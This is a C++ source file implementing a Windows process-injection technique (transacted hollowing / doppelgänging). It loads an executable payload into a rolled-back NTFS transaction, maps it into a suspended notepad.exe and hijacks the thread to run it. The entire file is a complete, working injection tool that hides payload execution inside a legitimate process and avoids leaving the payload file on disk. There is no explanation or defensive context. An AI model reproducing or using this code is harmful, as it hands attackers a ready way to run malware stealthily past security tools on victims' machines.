#include <Windows.h>
#include <winternl.h>
#include <stdio.h>
#include <iostream>

#pragma comment(lib, "ntdll.lib")

#define NT_SUCCESS(x) ((x) >= 0)

typedef struct _PROCESS_BASIC_INFORMATION64 {
    ULONGLONG Reserved1;
    ULONGLONG PebBaseAddress;
    ULONGLONG Reserved2[2];
    ULONGLONG UniqueProcessId;
    ULONGLONG Reserved3;
} PROCESS_BASIC_INFORMATION64;

typedef NTSTATUS(NTAPI* _NtCreateTransaction)(PHANDLE, ACCESS_MASK, PVOID, PVOID, PVOID, ULONG, ULONG, ULONG, PLARGE_INTEGER, PUNICODE_STRING);
typedef NTSTATUS(NTAPI* _NtRollbackTransaction)(HANDLE, BOOLEAN);
typedef NTSTATUS(NTAPI* _NtCreateSection)(PHANDLE, ACCESS_MASK, PVOID, PLARGE_INTEGER, ULONG, ULONG, HANDLE);
typedef NTSTATUS(NTAPI* _NtQueryInformationProcess)(HANDLE, PROCESSINFOCLASS, PVOID, ULONG, PULONG);
typedef NTSTATUS(NTAPI* _NtMapViewOfSection)(HANDLE, HANDLE, PVOID*, ULONG_PTR, SIZE_T, PLARGE_INTEGER, SIZE_T*, DWORD, ULONG, ULONG);
typedef PIMAGE_NT_HEADERS(NTAPI* _RtlImageNtHeader)(PVOID);

BYTE* ReadPayload(LPCWSTR path, DWORD& size) {
    HANDLE hFile = CreateFileW(path, GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        wprintf(L"[-] Failed to open payload\n");
        ExitProcess(1);
    }
    size = GetFileSize(hFile, NULL);
    BYTE* buffer = (BYTE*)VirtualAlloc(NULL, size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    DWORD read;
    ReadFile(hFile, buffer, size, &read, NULL);
    CloseHandle(hFile);
    return buffer;
}

HANDLE CreateTransactedSectionFromPayload(BYTE* payload, DWORD size) {
    HANDLE hTransaction, hFile, hSection;
    UNICODE_STRING us = { 0 };
    OBJECT_ATTRIBUTES oa = { 0 };
    _NtCreateTransaction NtCreateTransaction = (_NtCreateTransaction)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtCreateTransaction");
    _NtRollbackTransaction NtRollbackTransaction = (_NtRollbackTransaction)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtRollbackTransaction");
    _NtCreateSection NtCreateSection = (_NtCreateSection)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtCreateSection");

    NtCreateTransaction(&hTransaction, GENERIC_ALL, &oa, NULL, NULL, 0, 0, 0, NULL, &us);
    hFile = CreateFileTransactedW(L"C:\\temp\\~tempmap.txt", GENERIC_READ | GENERIC_WRITE, 0, NULL,
        CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL, hTransaction, NULL, NULL);
    DWORD written;
    WriteFile(hFile, payload, size, &written, NULL);

    NTSTATUS s = NtCreateSection(&hSection, SECTION_ALL_ACCESS, NULL, NULL, PAGE_READONLY, SEC_IMAGE, hFile);
    if (!NT_SUCCESS(s)) {
        wprintf(L"[-] NtCreateSection failed: 0x%lx\n", s);
        ExitProcess(1);
    }

    NtRollbackTransaction(hTransaction, TRUE);
    CloseHandle(hTransaction);
    CloseHandle(hFile);
    return hSection;
}

PROCESS_INFORMATION SpawnSuspendedTarget() {
    PROCESS_INFORMATION pi = {};
    STARTUPINFO si = { sizeof(si) };
    if (!CreateProcessW(L"C:\\Windows\\System32\\notepad.exe", NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi)) {
        wprintf(L"[-] Failed to create target process\n");
        ExitProcess(1);
    }
    return pi;
}

PVOID MapPayloadSection(HANDLE hProcess, HANDLE hSection) {
    _NtMapViewOfSection NtMapViewOfSection = (_NtMapViewOfSection)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtMapViewOfSection");
    PVOID base = NULL;
    SIZE_T viewSize = 0;
    NTSTATUS status = NtMapViewOfSection(hSection, hProcess, &base, 0, 0, NULL, &viewSize, ViewShare, 0, PAGE_READONLY);
    if (!NT_SUCCESS(status)) {
        wprintf(L"[-] Mapping section failed: 0x%lx\n", status);
        ExitProcess(1);
    }
    return base;
}

ULONG_PTR GetEntryFromMappedImage(BYTE* localPayload, PVOID mappedBase) {
    _RtlImageNtHeader RtlImageNtHeader = (_RtlImageNtHeader)GetProcAddress(GetModuleHandleA("ntdll.dll"), "RtlImageNtHeader");
    DWORD entryRVA = RtlImageNtHeader(localPayload)->OptionalHeader.AddressOfEntryPoint;
    return (ULONG_PTR)mappedBase + entryRVA;
}

PVOID GetRemotePEB(HANDLE hProcess) {
    PROCESS_BASIC_INFORMATION64 pbi = {};
    _NtQueryInformationProcess NtQueryInformationProcess = (_NtQueryInformationProcess)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtQueryInformationProcess");
    NTSTATUS status = NtQueryInformationProcess(hProcess, ProcessBasicInformation, &pbi, sizeof(pbi), NULL);
    if (!NT_SUCCESS(status)) {
        wprintf(L"[-] NtQueryInformationProcess failed\n");
        ExitProcess(1);
    }
    return (PVOID)pbi.PebBaseAddress;
}

void OverwriteRemoteImageBase(HANDLE hProcess, PVOID pebAddr, PVOID newBase) {
    SIZE_T written = 0;
    LPVOID addr = (LPBYTE)pebAddr + 0x10;
    WriteProcessMemory(hProcess, addr, &newBase, sizeof(PVOID), &written);
}

void HijackThreadToEP(PROCESS_INFORMATION& pi, ULONG_PTR ep) {
    CONTEXT ctx = { 0 };
    ctx.ContextFlags = CONTEXT_FULL;
    GetThreadContext(pi.hThread, &ctx);
    ctx.Rcx = ep;
    SetThreadContext(pi.hThread, &ctx);
}

int wmain() {
    wprintf(L"[+] Reading payload...\n");
    DWORD sz;
    BYTE* payload = ReadPayload(L"C:\\temp\\payload64.exe", sz);

    wprintf(L"[+] Creating transacted section...\n");
    HANDLE hSection = CreateTransactedSectionFromPayload(payload, sz);

    wprintf(L"[+] Spawning target process...\n");
    PROCESS_INFORMATION pi = SpawnSuspendedTarget();

    wprintf(L"[+] Mapping section to remote process...\n");
    PVOID remoteBase = MapPayloadSection(pi.hProcess, hSection);

    wprintf(L"[+] Getting entry point...\n");
    ULONG_PTR ep = GetEntryFromMappedImage(payload, remoteBase);

    wprintf(L"[+] Overwriting remote PEB...\n");
    PVOID peb = GetRemotePEB(pi.hProcess);
    OverwriteRemoteImageBase(pi.hProcess, peb, remoteBase);

    wprintf(L"[+] Redirecting thread to payload entry point...\n");
    HijackThreadToEP(pi, ep);

    wprintf(L"[+] Resuming execution...\n");
    ResumeThread(pi.hThread);

    wprintf(L"[+] Injection complete.\n");
    return 0;
}
